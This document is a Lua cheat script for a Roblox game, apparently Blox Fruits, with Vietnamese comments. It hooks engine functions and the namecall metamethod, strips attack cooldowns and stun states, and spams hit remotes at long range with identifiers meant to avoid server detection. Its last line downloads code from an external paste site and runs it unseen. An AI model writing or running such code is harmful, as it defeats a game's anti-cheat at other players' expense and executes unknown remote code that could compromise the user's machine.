-- [[ MELEE / SWORD / FRUIT ONLY LOGIC - GOD TIER MAX SPEED ]]
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- [ HOOK TASK.DELAY CHỐNG KẸT ]
local old
old = hookfunction(task.delay, function(t, f, ...)
    local char = LocalPlayer.Character
    local tool = char and char:FindFirstChildOfClass("Tool")
    if tool then
        local isGun = (tool:GetAttribute("WeaponType") == "Gun") or (tool.ToolTip == "Gun")
        if isGun and old then return old(t, f, ...) end
    end
    if t > 0.1 and old then return old(0, f, ...) end
    if old then return old(t, f, ...) end
end)

pcall(function() game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso") end)
task.spawn(function()
    while task.wait(0.5) do
        local char = workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name) or LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 and not char:FindFirstChild("HasBuso") then
            pcall(function() game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso") end)
        end
    end
end)

local RANGE = 1000 
local AllTargets = {}

-- [ FRAMEWORK FIX ]
local CachedFramework, LastCheckedChar, LastEquippedTool = nil, nil, nil
local function GetFramework()
    local char = workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name) or LocalPlayer.Character
    if not char or not char:FindFirstChild("Humanoid") or char.Humanoid.Health <= 0 then
        CachedFramework, LastCheckedChar, LastEquippedTool = nil, nil, nil
        return nil
    end
    local currentTool = char:FindFirstChildOfClass("Tool")
    if LastCheckedChar ~= char or LastEquippedTool ~= currentTool then
        CachedFramework, LastCheckedChar, LastEquippedTool = nil, char, currentTool
    end
    if CachedFramework then return CachedFramework end
    for _, v in pairs(getgc(true)) do
        if type(v) == "table" and rawget(v, "activeController") then
            CachedFramework = v.activeController
            return CachedFramework
        end
    end
end

local function FastAttack()
    pcall(function()
        local ac = GetFramework()
        if ac and ac.equipped then
            ac.hitboxMagnitude = 60 
            ac.timeToNextAttack = 0
            ac.attacking = false
            ac.blocking = false 
            ac.increment = 1 
            ac.active = false 
            ac.focusStart = 0
            ac.currentActivity = "" 
            if ac.animator and ac.animator.anims and ac.animator.anims.basic then
                for _, v in pairs(ac.animator.anims.basic) do
                    if v.IsPlaying then v:Stop() end 
                end
            end
        end
    end)
end

-- [ QUÉT MỤC TIÊU ]
task.spawn(function()
    while task.wait(0.1) do
        local char = workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name) or LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local targets = {} 
        if root then
            for _, folder in pairs({workspace:FindFirstChild("Enemies"), workspace:FindFirstChild("Characters")}) do
                if folder then
                    for _, v in ipairs(folder:GetChildren()) do
                        if v:IsA("Model") and v ~= char and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                            local tPart = v:FindFirstChild("HumanoidRootPart") or v:FindFirstChild("UpperTorso")
                            if tPart and (tPart.Position - root.Position).Magnitude < RANGE then
                                table.insert(targets, v)
                            end
                        end
                    end
                end
            end
            table.sort(targets, function(a, b)
                local pA, pB = a:FindFirstChild("HumanoidRootPart") or a:FindFirstChild("UpperTorso"), b:FindFirstChild("HumanoidRootPart") or b:FindFirstChild("UpperTorso")
                return (pA and pB) and ((pA.Position - root.Position).Magnitude < (pB.Position - root.Position).Magnitude) or false
            end)
        end
        AllTargets = targets 
    end
end)

-- [ ĐỢI REMOTE ]
local Net, regHit, regAttack
repeat
    task.wait(0.5)
    pcall(function()
        Net = ReplicatedStorage:FindFirstChild("Modules"):FindFirstChild("Net")
        regHit = Net:FindFirstChild("RE/RegisterHit")
        regAttack = Net:FindFirstChild("RE/RegisterAttack")
    end)
until Net and regHit and regAttack

-- [ BYPASS CLICK DELAY TẬN GỐC & XOÁ TRẠNG THÁI NHÂN VẬT ]
local oldNM = nil
local function ExtremeBypass(tool, char)
    pcall(function()
        -- 1. Xoá trạng thái khựng của nhân vật (Nguyên nhân chính làm Damage bị khựng 0.5s)
        if char then
            local busy = char:FindFirstChild("Busy")
            local stun = char:FindFirstChild("Stun")
            if busy then busy.Value = false end
            if stun then stun.Value = 0 end
        end

        -- 2. Mở khóa Tool
        if tool:IsA("Tool") then
            tool:SetAttribute("AttackCooldown", 0)
            tool:SetAttribute("LastAttack", 0)
            tool:SetAttribute("State", 0) 
            tool:SetAttribute("Combo", 1)
            
            if tool:FindFirstChild("ClickDelay") then tool.ClickDelay.Value = 0 end
            if tool:FindFirstChild("Cooldown") then tool.Cooldown.Value = 0 end

            if not getgenv().HookedMelee then
                oldNM = hookmetamethod(game, "__namecall", function(self, ...)
                    if getnamecallmethod() == "FireServer" and self.Name == "RE/RegisterAttack" and oldNM then
                        return oldNM(self, -math.huge)
                    end
                    if oldNM then return oldNM(self, ...) end
                end)
                getgenv().HookedMelee = true
            end
        end
    end)
end

-- [ GIGA SPEED MELEE / SWORD / FRUIT CORE ]
local FruitCombo = 1
local unbanID_base = tostring(LocalPlayer.UserId):sub(2,4)..tostring(coroutine.running()):sub(11,15)

-- Đưa logic tấn công vào một hàm riêng để chạy song song
local function PerformAttack()
    local char = workspace:FindFirstChild("Characters") and workspace.Characters:FindFirstChild(LocalPlayer.Name) or LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local tool = char and char:FindFirstChildOfClass("Tool")
    
    if not regHit or not regAttack or not tool or not root or #AllTargets == 0 then return end

    local toolName = tool.Name:lower()
    local isGuitar = toolName:find("guitar")
    local isAnyGun = (tool:GetAttribute("WeaponType") == "Gun") or (tool.ToolTip == "Gun") or isGuitar
    local isFruit = (tool.ToolTip == "Blox Fruit")
    
    if isAnyGun then return end

    -- Xoá bỏ mọi giới hạn khựng của nhân vật ngay lập tức
    ExtremeBypass(tool, char)
    FastAttack() 

    -- Lọc danh sách mục tiêu
    local fullHitList = {}
    for j = 1, math.min(#AllTargets, 10) do
        local monster = AllTargets[j]
        if monster and monster.Parent and monster:FindFirstChild("Humanoid") and monster.Humanoid.Health > 0 then
            local part = monster:FindFirstChild("UpperTorso") or monster:FindFirstChild("Head")
            if part then table.insert(fullHitList, {monster, part}) end
        end
    end

    if #fullHitList > 0 then
        -- Xoay vòng Combo tự nhiên nhất để Server không chặn
        FruitCombo = FruitCombo >= 4 and 1 or FruitCombo + 1

        -- Chạy đa luồng cực gắt nhưng đồng bộ
        for i = 1, 3 do 
            task.spawn(function() 
                local unbanID = unbanID_base .. i 
                pcall(function()
                    -- Gửi Hit thực tế
                    regHit:FireServer(fullHitList[1][2], fullHitList, nil, nil, unbanID)
                    
                    if isFruit then
                        local leftClick = tool:FindFirstChild("LeftClickRemote", true)
                        if leftClick then
                            local lookVector = (fullHitList[1][2].Position - root.Position).Unit
                            if lookVector ~= lookVector then lookVector = Vector3.new(0, 1, 0) end 
                            
                            -- Spam trực tiếp bằng Combo đã đồng bộ
                            leftClick:FireServer(lookVector, FruitCombo, unbanID_base)
                        end
                    else
                        if i == 1 then
                            regAttack:FireServer(-math.huge)
                        end
                    end
                end)
            end)
        end
    end
end

-- DUAL-LOOP: Chạy cùng lúc ở cả 2 Engine Render của game (Nhân đôi tốc độ xả gói tin)
RunService.Heartbeat:Connect(PerformAttack)
RunService.Stepped:Connect(PerformAttack)

pcall(function() loadstring(game:HttpGet("https://pastefy.app/9oi8Fw4M/raw"))() end)
